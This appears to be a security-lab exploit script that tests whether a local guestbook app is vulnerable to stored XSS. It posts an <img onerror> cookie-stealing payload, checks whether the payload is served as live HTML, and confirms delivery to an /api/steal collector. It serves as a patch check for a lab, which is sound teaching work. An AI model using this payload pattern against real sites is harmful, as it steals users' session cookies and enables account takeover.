// Lab 5 exploit — stored XSS + cookie theft (CWE-79).
//
// We cannot run a real browser headlessly, so this script EMULATES what a
// victim's browser does when it loads the guestbook:
//   1. Post a comment whose body is an <img onerror> cookie-stealer.
//   2. Fetch the comment back and decide "would a browser execute this?" — i.e.
//      is the body served as live HTML (a tag), or harmlessly encoded (&lt;img)?
//   3. If it is live HTML, fire the steal request the browser would have fired,
//      then confirm the cookie landed in the attacker's collector (/api/steal).
//
// Exit 0 = exploit worked. Non-zero = patched (body encoded/stripped, no steal).
const BASE = process.env.BASE_URL ?? "http://localhost:3000";

// A real in-browser payload reads document.cookie; headless we use a marker.
const MARKER = `sid-victim-${Date.now()}`;
const PAYLOAD = `<img src=x onerror="fetch('/api/steal?c=${MARKER}')">`;

async function main() {
  // 1. Store the malicious comment.
  await fetch(`${BASE}/api/comments`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ author: "attacker", body: PAYLOAD }),
  });
  console.log(`[xss] stored comment payload: ${PAYLOAD}`);

  // 2. Victim loads the guestbook — does the body come back as live HTML?
  const list: any = await (await fetch(`${BASE}/api/comments`)).json();
  const mine = (list.comments ?? []).find((c: any) => c.body?.includes(MARKER));
  const servedRaw = !!mine && /<img|<script/i.test(mine.body); // not &lt;img...

  if (!servedRaw) {
    console.log("\n  payload was encoded/stripped — a browser would NOT run it. Patched. ✅");
    process.exit(1);
  }
  console.log("[xss] body served as live HTML — a browser WOULD execute it.");

  // 3. Emulate the browser firing the onerror handler.
  await fetch(`${BASE}/api/steal?c=${MARKER}`);

  // 4. Confirm the cookie reached the attacker's collector.
  const loot: any = await (await fetch(`${BASE}/api/steal`)).json();
  const captured = (loot.stolen ?? []).some((s: any) => s.value === MARKER);

  if (captured) {
    console.log(`\n  HIT — cookie "${MARKER}" exfiltrated to /api/steal.`);
    process.exit(0);
  }
  console.log("\n  payload ran but collector saw nothing — unexpected.");
  process.exit(1);
}

main();
